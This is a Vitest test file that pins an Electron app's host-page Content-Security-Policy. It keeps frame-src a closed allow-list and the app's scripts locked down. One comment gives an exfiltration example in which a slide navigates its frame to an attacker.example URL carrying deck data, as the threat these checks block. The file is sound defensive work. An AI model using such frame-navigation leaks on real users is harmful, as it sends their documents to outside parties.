import { readFile } from 'node:fs/promises'
import { join } from 'node:path'
import { describe, expect, it } from 'vitest'
import { SLIDE_SCHEME } from '../../../src/shared/slide-protocol'

/**
 * The host page's own CSP, pinned from the file.
 *
 * `frame-src` is the one CSP decision `slide://` delivery does *not* escape: it governs the
 * embedder's choice of what may be framed, so a policy that omits `slide:` blocks every slide from
 * loading at all. That failure only shows up in a real Electron window — happy-dom does not enforce
 * CSP and never fetches a frame's `src` — so without this check the whole milestone could regress
 * to a deck of blank rectangles with a green unit suite.
 *
 * The rest of the assertions are the counterweight: `frame-src` had to be widened by exactly one
 * scheme and nothing else may drift with it.
 */
const INDEX_HTML = join(process.cwd(), 'src/renderer/index.html')

async function hostCsp(): Promise<string> {
  const html = await readFile(INDEX_HTML, 'utf8')
  const match = /http-equiv="Content-Security-Policy"\s*\n?\s*content="([^"]+)"/.exec(html)
  expect(match).not.toBeNull()
  return match?.[1] ?? ''
}

describe('host renderer CSP', () => {
  it('allows framing the slide scheme', async () => {
    const csp = await hostCsp()
    const frameSrc = csp.split(';').find((directive) => directive.trim().startsWith('frame-src'))

    expect(frameSrc).toBeDefined()
    expect(frameSrc).toContain(`${SLIDE_SCHEME}:`)
  })

  // The plain-browser fallback (the evidence recorder, happy-dom) has no main process and delivers
  // slides as blob URLs, so removing `blob:` would take the recorder down without failing any other
  // test here.
  it('still allows the blob fallback transport', async () => {
    const csp = await hostCsp()
    expect(csp).toContain('blob:')
  })

  /**
   * The host page is still hostile ground for the app's *own* code (§7 layer 1). In particular
   * `script-src 'self'` is what used to block slides' inline script through blob inheritance — the
   * fix was to stop inheriting, never to loosen this.
   */
  it('keeps the app renderer locked down', async () => {
    const csp = await hostCsp()
    expect(csp).toContain("script-src 'self'")
    expect(csp).toContain("default-src 'self'")
    expect(csp).toContain("object-src 'none'")
    expect(csp).toContain("base-uri 'none'")
    expect(csp).not.toContain("script-src 'unsafe-inline'")
    expect(csp).not.toContain("'unsafe-eval'")
  })

  // `slide:` belongs in exactly one directive. Listing it under `default-src` or `script-src` would
  // let the *app* page load code from the scheme that serves model-generated documents.
  it('grants the slide scheme nothing beyond being framed', async () => {
    const csp = await hostCsp()
    const granting = csp
      .split(';')
      .map((directive) => directive.trim())
      .filter((directive) => directive.includes(`${SLIDE_SCHEME}:`))

    expect(granting).toHaveLength(1)
    expect(granting[0]).toMatch(/^frame-src /)
  })

  /**
   * `frame-src` is containment, not just embedding.
   *
   * It governs **every navigation of a child frame**, not merely its initial `src` — which makes it
   * the directive that stops a running slide from navigating itself to
   * `https://attacker.example/?d=<deck>`. Nothing on the slide's own policy covers that: no shipped
   * CSP directive governs a frame navigating itself, and the sandbox only withholds navigation of
   * the *top* frame. Measured in the real app, where the attempt is refused with "Framing 'http://…'
   * violates the following Content Security Policy directive: frame-src …" and no request is made.
   *
   * So this must stay a closed allow-list of exactly the two delivery transports. A `*`, an
   * `https:`, or a bare scheme added here in the future would silently reopen an exfiltration
   * channel that no other test in the suite is watching.
   */
  it('keeps frame-src a closed allow-list of the two delivery transports', async () => {
    const csp = await hostCsp()
    const frameSrc = (
      csp.split(';').find((directive) => directive.trim().startsWith('frame-src')) ?? ''
    ).trim()

    expect(frameSrc.split(/\s+/).slice(1).toSorted()).toEqual(['blob:', `${SLIDE_SCHEME}:`])
  })

  // Dropped in M2.0: the app frames slides and nothing else, and `'self'` would have let a slide
  // navigate its own frame to the app's document.
  it('does not let a frame navigate to the app document itself', async () => {
    const csp = await hostCsp()
    const frameSrc = csp.split(';').find((directive) => directive.trim().startsWith('frame-src'))

    expect(frameSrc).not.toContain("'self'")
  })
})
